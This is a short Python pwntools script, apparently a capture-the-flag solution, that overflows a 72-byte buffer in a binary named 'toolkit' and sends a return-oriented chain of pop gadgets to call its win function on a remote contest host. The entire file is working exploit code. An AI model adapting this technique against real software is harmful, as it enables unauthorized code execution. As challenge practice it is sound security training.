#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./toolkit', checksec=False)
context.arch = 'amd64'

OFFSET_TO_RIP = 72

a = 0x1111111111111111
b = 0x2222222222222222
c = 0x3333333333333333

#p = process(elf.path)
HOST,PORT="offsec.m0lecon.it",13519
p=remote(HOST,PORT)

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(a),
    p64(elf.sym.pop_rsi_ret), p64(b),
    p64(elf.sym.pop_rdx_ret), p64(c),
    p64(elf.sym.win),
)

p.recvuntil(b'Input:')
p.send(payload)
p.interactive()
